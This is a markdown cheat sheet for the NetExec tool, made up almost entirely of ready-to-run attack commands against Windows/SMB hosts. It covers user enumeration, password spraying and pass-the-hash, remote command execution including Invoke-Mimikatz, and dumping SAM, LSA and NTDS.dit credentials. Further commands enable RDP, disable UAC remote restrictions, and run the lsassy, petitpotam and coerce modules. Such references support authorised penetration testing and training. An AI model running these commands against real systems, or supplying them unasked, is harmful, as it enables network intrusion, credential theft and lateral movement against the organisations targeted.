# 🕷️ NetExec

## 📚 Resource

- [netexec.wiki](https://www.netexec.wiki/)

## 🎯 Basic Usage

```bash
nxc <proto> $TARGET
nxc <proto> 192.168.1.10-20
nxc <proto> $SUBNET/$MASK
nxc <proto> targets.txt
```

## 🔍 Enumeration

```bash
# List users (anonymous or with credentials)
nxc smb $TARGET -u '' -p '' --users
```

### Auth required (Examples)

```bash
nxc smb $TARGET -u $USER -p $PASSWORD --groups
```

:::details SMB Enumeration Flags

| Option             | Description                                     |
| ------------------ | ----------------------------------------------- |
| `--users`          | List domain users                               |
| `--groups`         | List domain groups                              |
| `--shares`         | List accessible SMB shares                      |
| `--sessions`       | Check active sessions on target                 |
| `--local-admins`   | Find local administrators (requires privileges) |
| `--loggedon-users` | List users logged onto the machine              |
| `--pass-pol`       | Display domain password policy                  |
| `--rid-brute`      | RID brute force to enumerate users              |

:::

## Credential Testing

```bash
# Test single username/password
nxc smb $TARGET -u $USER -p $PASSWORD

# Test with NTLM hash (Pass-the-Hash)
nxc smb $TARGET -u $USER -H $LMHASH:$NTHASH
nxc smb $TARGET -u $USER -H $NTHASH

# Password spraying with lists
nxc smb $TARGET -u users.txt -p passwords.txt --continue-on-success
```

## Execution

```bash
# Execute command remotely (default: WMI)
nxc smb $TARGET -u $USER -p $PASSWORD -x 'whoami'

# Specify execution method
nxc smb $TARGET -u $USER -p $PASSWORD --exec-method smbexec -x 'whoami'

# PowerShell command
nxc smb $TARGET -u $USER -p $PASSWORD -X '$PSVersionTable'

# Run a script or payload
nxc smb $TARGET -u $USER -p $PASSWORD -x 'powershell -nop -c "Invoke-Mimikatz"'
```

## 🛠️ Post-Exploitation

```bash
# Dump local SAM hashes
nxc smb $TARGET -u $USER -p $PASSWORD --sam

# Extract LSA secrets
nxc smb $TARGET -u $USER -p $PASSWORD --lsa

# Dump NTDS.dit (domain hashes)
nxc smb $TARGET -u $USER -p $PASSWORD --ntds
nxc smb $TARGET -u $USER -p $PASSWORD --ntds --use-vss

# Enable RDP
nxc smb $TARGET -u $USER -p $PASSWORD --enable-rdp

# Disable UAC remote restrictions
nxc smb $TARGET -u $USER -p $PASSWORD --disable-uac
```

- `--lsa` : extract LSA secrets (including cached credentials and tokens)
- `--ntds` : dump cached domain credentials from NTDS.dit (requires high privileges)
- `--enable-rdp` : enable Remote Desktop (on the remote host)
- `--disable-uac` : disable UAC remote restrictions

## 🧩 Modules

```bash
# Listing modules
nxc smb $TARGET -u $USER -p $PASSWORD -L

# Use modules
nxc smb $TARGET -u $USER -p $PASSWORD -M mimikatz
nxc smb $TARGET -u $USER -p $PASSWORD -M lsassy
nxc smb $TARGET -u $USER -p $PASSWORD -M petitpotam
nxc smb $TARGET -u $USER -p $PASSWORD -M coerce

# Module with options
nxc smb $TARGET -u $USER -p $PASSWORD -M spider_plus -o DOWNLOAD_FLAG=False
```

## MISC

```bash
# Check domain controller info
nxc smb $TARGET -u $USER -p $PASSWORD --dc

# Query domain users and info
nxc smb $TARGET -u $USER -p $PASSWORD --pass-pol

# List logged on users on remote host
nxc smb $TARGET -u $USER -p $PASSWORD --loggedon-users
```
